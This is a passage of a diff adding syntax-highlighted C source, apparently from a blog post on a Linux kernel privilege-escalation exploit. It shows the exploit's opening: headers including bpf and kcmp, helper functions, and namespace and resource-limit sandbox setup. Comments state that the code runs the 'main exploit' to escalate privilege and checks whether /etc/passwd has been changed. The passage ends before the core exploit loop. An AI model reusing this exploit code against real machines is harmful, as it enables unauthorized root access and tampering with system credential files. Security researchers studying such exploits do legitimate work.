+</span><span class="lnt">165
+</span><span class="lnt">166
+</span><span class="lnt">167
+</span><span class="lnt">168
+</span><span class="lnt">169
+</span><span class="lnt">170
+</span><span class="lnt">171
+</span><span class="lnt">172
+</span><span class="lnt">173
+</span><span class="lnt">174
+</span><span class="lnt">175
+</span><span class="lnt">176
+</span><span class="lnt">177
+</span><span class="lnt">178
+</span><span class="lnt">179
+</span><span class="lnt">180
+</span><span class="lnt">181
+</span><span class="lnt">182
+</span><span class="lnt">183
+</span><span class="lnt">184
+</span><span class="lnt">185
+</span><span class="lnt">186
+</span><span class="lnt">187
+</span><span class="lnt">188
+</span><span class="lnt">189
+</span><span class="lnt">190
+</span><span class="lnt">191
+</span><span class="lnt">192
+</span><span class="lnt">193
+</span><span class="lnt">194
+</span><span class="lnt">195
+</span><span class="lnt">196
+</span><span class="lnt">197
+</span><span class="lnt">198
+</span><span class="lnt">199
+</span><span class="lnt">200
+</span><span class="lnt">201
+</span><span class="lnt">202
+</span><span class="lnt">203
+</span><span class="lnt">204
+</span><span class="lnt">205
+</span><span class="lnt">206
+</span><span class="lnt">207
+</span><span class="lnt">208
+</span><span class="lnt">209
+</span><span class="lnt">210
+</span><span class="lnt">211
+</span><span class="lnt">212
+</span><span class="lnt">213
+</span><span class="lnt">214
+</span><span class="lnt">215
+</span><span class="lnt">216
+</span><span class="lnt">217
+</span><span class="lnt">218
+</span><span class="lnt">219
+</span><span class="lnt">220
+</span><span class="lnt">221
+</span><span class="lnt">222
+</span><span class="lnt">223
+</span><span class="lnt">224
+</span><span class="lnt">225
+</span><span class="lnt">226
+</span><span class="lnt">227
+</span><span class="lnt">228
+</span><span class="lnt">229
+</span><span class="lnt">230
+</span><span class="lnt">231
+</span><span class="lnt">232
+</span><span class="lnt">233
+</span><span class="lnt">234
+</span><span class="lnt">235
+</span><span class="lnt">236
+</span><span class="lnt">237
+</span><span class="lnt">238
+</span><span class="lnt">239
+</span><span class="lnt">240
+</span><span class="lnt">241
+</span><span class="lnt">242
+</span><span class="lnt">243
+</span><span class="lnt">244
+</span><span class="lnt">245
+</span><span class="lnt">246
+</span><span class="lnt">247
+</span><span class="lnt">248
+</span><span class="lnt">249
+</span><span class="lnt">250
+</span><span class="lnt">251
+</span><span class="lnt">252
+</span><span class="lnt">253
+</span><span class="lnt">254
+</span><span class="lnt">255
+</span><span class="lnt">256
+</span><span class="lnt">257
+</span><span class="lnt">258
+</span><span class="lnt">259
+</span><span class="lnt">260
+</span><span class="lnt">261
+</span><span class="lnt">262
+</span><span class="lnt">263
+</span><span class="lnt">264
+</span><span class="lnt">265
+</span><span class="lnt">266
+</span><span class="lnt">267
+</span><span class="lnt">268
+</span><span class="lnt">269
+</span><span class="lnt">270
+</span><span class="lnt">271
+</span><span class="lnt">272
+</span><span class="lnt">273
+</span><span class="lnt">274
+</span><span class="lnt">275
+</span><span class="lnt">276
+</span><span class="lnt">277
+</span><span class="lnt">278
+</span><span class="lnt">279
+</span><span class="lnt">280
+</span><span class="lnt">281
+</span><span class="lnt">282
+</span><span class="lnt">283
+</span><span class="lnt">284
+</span><span class="lnt">285
+</span><span class="lnt">286
+</span><span class="lnt">287
+</span><span class="lnt">288
+</span><span class="lnt">289
+</span><span class="lnt">290
+</span><span class="lnt">291
+</span><span class="lnt">292
+</span><span class="lnt">293
+</span><span class="lnt">294
+</span><span class="lnt">295
+</span><span class="lnt">296
+</span><span class="lnt">297
+</span><span class="lnt">298
+</span><span class="lnt">299
+</span><span class="lnt">300
+</span><span class="lnt">301
+</span><span class="lnt">302
+</span><span class="lnt">303
+</span><span class="lnt">304
+</span><span class="lnt">305
+</span><span class="lnt">306
+</span><span class="lnt">307
+</span><span class="lnt">308
+</span><span class="lnt">309
+</span><span class="lnt">310
+</span><span class="lnt">311
+</span><span class="lnt">312
+</span><span class="lnt">313
+</span><span class="lnt">314
+</span><span class="lnt">315
+</span><span class="lnt">316
+</span><span class="lnt">317
+</span><span class="lnt">318
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// gcc -static -pthread ./exploit -o ./exploit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#define _GNU_SOURCE
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;endian.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sched.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdarg.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mount.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/prctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/resource.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/syscall.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/time.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/wait.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;pthread.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/uio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/kcmp.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/capability.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">die</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">fmt</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">va_list</span> <span class="n">params</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="nf">va_start</span><span class="p">(</span><span class="n">params</span><span class="p">,</span> <span class="n">fmt</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">vfprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="n">fmt</span><span class="p">,</span> <span class="n">params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">va_end</span><span class="p">(</span><span class="n">params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// use_temporary_dir() —— setup working dir, create writable file &#34;./exp_dir/data&#34;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">use_temporary_dir</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">chdir</span><span class="p">(</span><span class="s">&#34;/tmp&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">system</span><span class="p">(</span><span class="s">&#34;rm -rf exp_dir; mkdir exp_dir; touch exp_dir/data&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">tmpdir</span> <span class="o">=</span> <span class="s">&#34;exp_dir&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">tmpdir</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">chmod</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">,</span> <span class="mo">0777</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">chdir</span><span class="p">(</span><span class="n">tmpdir</span><span class="p">))</span>  <span class="c1">// set current work dir
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// write_file() —— write sysctl file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">bool</span> <span class="nf">write_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">file</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">what</span><span class="p">,</span> <span class="p">...)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">  <span class="n">va_list</span> <span class="n">args</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">va_start</span><span class="p">(</span><span class="n">args</span><span class="p">,</span> <span class="n">what</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">vsnprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="n">what</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">va_end</span><span class="p">(</span><span class="n">args</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">buf</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">file</span><span class="p">,</span> <span class="n">O_WRONLY</span> <span class="o">|</span> <span class="n">O_CLOEXEC</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">len</span><span class="p">)</span> <span class="o">!=</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">err</span> <span class="o">=</span> <span class="n">errno</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">errno</span> <span class="o">=</span> <span class="n">err</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">setup_common</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">mount</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#34;/sys/fs/fuse/connections&#34;</span><span class="p">,</span> <span class="s">&#34;fusectl&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">void</span> <span class="nf">loop</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// sandbox_common() —— setup sub-process parameter (memory / namespace / msg)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">void</span> <span class="nf">sandbox_common</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">prctl</span><span class="p">(</span><span class="n">PR_SET_PDEATHSIG</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setsid</span><span class="p">();</span>   <span class="c1">// 调用 setsid() 后 namespace_sandbox_proc() 子进程不受终端影响，终端退出，不影响子进程继续运行
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">struct</span> <span class="n">rlimit</span> <span class="n">rlim</span><span class="p">;</span>   <span class="c1">// setrlimit() - https://blog.csdn.net/sinat_38816924/article/details/122241661
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="p">(</span><span class="mi">200</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_AS</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>              <span class="c1">// 进程的虚拟内存(地址空间)的最大大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_MEMLOCK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>         <span class="c1">// 锁定到RAM中的最大内存字节数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">136</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_FSIZE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>           <span class="c1">// 该进程可能创建的文件的最大大小(以字节为单位)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_STACK</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>           <span class="c1">// 最大的进程堆栈，以字节为单位
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_CORE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>            <span class="c1">// 内核转存文件的最大长度
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_cur</span> <span class="o">=</span> <span class="n">rlim</span><span class="p">.</span><span class="n">rlim_max</span> <span class="o">=</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setrlimit</span><span class="p">(</span><span class="n">RLIMIT_NOFILE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">rlim</span><span class="p">);</span>          <span class="c1">// 指定比进程可打开的最大文件描述符数量，超出此值，将会产生EMFILE错误
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_NEWNS</span><span class="p">))</span> <span class="p">{</span>         <span class="c1">// unshare() - https://man7.org/linux/man-pages/man2/unshare.2.html
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>                                   <span class="c1">// CLONE_NEWNS - the calling process has a private copy of its namespace which is not shared with any other process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="k">if</span> <span class="p">(</span><span class="nf">mount</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">&#34;/&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">MS_REC</span> <span class="o">|</span> <span class="n">MS_PRIVATE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_NEWIPC</span><span class="p">))</span> <span class="p">{</span>        <span class="c1">// CLONE_NEWIPC - the calling process has a private copy of the IPC namespace which is not shared with any other process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="mh">0x02000000</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_NEWUTS</span><span class="p">))</span> <span class="p">{</span>        <span class="c1">// CLONE_NEWUTS - the calling process has a private copy of the UTS namespace which is not shared with any other process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nf">unshare</span><span class="p">(</span><span class="n">CLONE_SYSVSEM</span><span class="p">))</span> <span class="p">{</span>       <span class="c1">// CLONE_SYSVSEM - the calling process has a new empty semadj list that is not shared with any other process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">typedef</span> <span class="k">struct</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="kt">sysctl_t</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">static</span> <span class="k">const</span> <span class="kt">sysctl_t</span> <span class="n">sysctls</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/shmmax&#34;</span><span class="p">,</span> <span class="s">&#34;16777216&#34;</span><span class="p">},</span>    <span class="c1">// 定义单个共享内存段的最大值 https://blog.csdn.net/shmily_lsl/article/details/103384366
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/shmall&#34;</span><span class="p">,</span> <span class="s">&#34;536870912&#34;</span><span class="p">},</span>   <span class="c1">// 控制可以使用的共享内存的总页数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/shmmni&#34;</span><span class="p">,</span> <span class="s">&#34;1024&#34;</span><span class="p">},</span>        <span class="c1">// 设置系统范围内共享内存段的最大数量。该参数的默认值是 4096
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/msgmax&#34;</span><span class="p">,</span> <span class="s">&#34;8192&#34;</span><span class="p">},</span>        <span class="c1">// 一个消息的字节大小
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/msgmni&#34;</span><span class="p">,</span> <span class="s">&#34;1024&#34;</span><span class="p">},</span>        <span class="c1">// 系统范围内的消息队列上限
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/msgmnb&#34;</span><span class="p">,</span> <span class="s">&#34;1024&#34;</span><span class="p">},</span>        <span class="c1">// 一个消息队列的容量，最大字节数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="p">{</span><span class="s">&#34;/proc/sys/kernel/sem&#34;</span><span class="p">,</span> <span class="s">&#34;1024 1048576 500 1024&#34;</span><span class="p">},</span> <span class="c1">// 每个信号集中的最大信号量数目; 系统范围内的最大信号量总数目; 每个信号发生时的最大系统操作数目; 系统范围内的最大信号集总数目
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="p">};</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">unsigned</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sysctls</span><span class="p">)</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sysctls</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">write_file</span><span class="p">(</span><span class="n">sysctls</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">name</span><span class="p">,</span> <span class="n">sysctls</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">value</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">wait_for_loop</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">int</span> <span class="n">status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="nf">waitpid</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="n">__WALL</span><span class="p">)</span> <span class="o">!=</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">WEXITSTATUS</span><span class="p">(</span><span class="n">status</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">real_uid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="n">real_gid</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">__attribute__</span><span class="p">((</span><span class="nf">aligned</span><span class="p">(</span><span class="mi">64</span> <span class="o">&lt;&lt;</span> <span class="mi">10</span><span class="p">)))</span> <span class="k">static</span> <span class="kt">char</span> <span class="n">sandbox_stack</span><span class="p">[</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// sub-process
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">namespace_sandbox_proc</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">sandbox_common</span><span class="p">();</span>     <span class="c1">// setup sub-process parameter (memory / namespace / msg)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">loop</span><span class="p">();</span>               <span class="c1">// main exploit
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// create sub-process to escalate privilege and check whether the &#34;/etc/passwd&#34; is changed
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">static</span> <span class="kt">int</span> <span class="nf">do_sandbox_namespace</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nf">setup_common</span><span class="p">();</span>       <span class="c1">// no use
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">real_uid</span> <span class="o">=</span> <span class="nf">getuid</span><span class="p">();</span>  <span class="c1">// no use
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">real_gid</span> <span class="o">=</span> <span class="nf">getgid</span><span class="p">();</span>  <span class="c1">// no use
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="nf">mprotect</span><span class="p">(</span><span class="n">sandbox_stack</span><span class="p">,</span> <span class="mi">4096</span><span class="p">,</span> <span class="n">PROT_NONE</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
